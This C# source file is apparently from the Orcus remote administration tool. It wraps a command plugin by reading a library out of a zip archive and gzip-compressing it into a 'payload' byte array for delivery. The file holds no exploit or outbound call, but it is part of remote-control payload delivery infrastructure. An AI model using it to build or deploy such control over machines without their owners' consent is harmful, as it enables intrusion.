using System;
using System.IO;
using System.IO.Compression;
using System.Windows.Media.Imaging;
using Orcus.Administration.Plugins;
using Orcus.Plugins;

namespace Orcus.Administration.Core.Plugins.Wrappers
{
    public class FactoryCommandPlugin : IPayload, ICommandPlugin, IViewPlugin
    {
        public FactoryCommandPlugin(string path, PluginInfo pluginInfo, BitmapImage thumbnail,
            ICommandAndViewPlugin plugin, uint commandId)
        {
            Path = path;
            PluginInfo = pluginInfo;
            Thumbnail = thumbnail;
            Plugin = plugin;
            CommandId = commandId;

            using (var fs = new FileStream(Path, FileMode.Open, FileAccess.Read))
            using (var archive = new ZipArchive(fs, ZipArchiveMode.Read))
            using (var zipStream = archive.GetEntry(PluginInfo.Library2).Open())
            using (var ms = new MemoryStream())
            {
                using (var gzip = new GZipStream(ms, CompressionMode.Compress, true))
                {
                    zipStream.CopyTo(gzip);
                }
                Size = ms.Length;
            }
        }

        public ICommandAndViewPlugin Plugin { get; }
        public Type CommandType => Plugin.Command;
        public uint CommandId { get; }
        public string Path { get; }
        public PluginInfo PluginInfo { get; }
        public BitmapImage Thumbnail { get; }
        public long Size { get; }

        public byte[] GetPayload()
        {
            using (var fs = new FileStream(Path, FileMode.Open, FileAccess.Read))
            using (var archive = new ZipArchive(fs, ZipArchiveMode.Read))
            using (var zipStream = archive.GetEntry(PluginInfo.Library2).Open())
            using (var ms = new MemoryStream())
            {
                using (var gzip = new GZipStream(ms, CompressionMode.Compress, true))
                {
                    zipStream.CopyTo(gzip);
                }
                return ms.ToArray();
            }
        }

        public Type CommandView => Plugin.CommandView;
        public Type ViewType => Plugin.View;
    }
}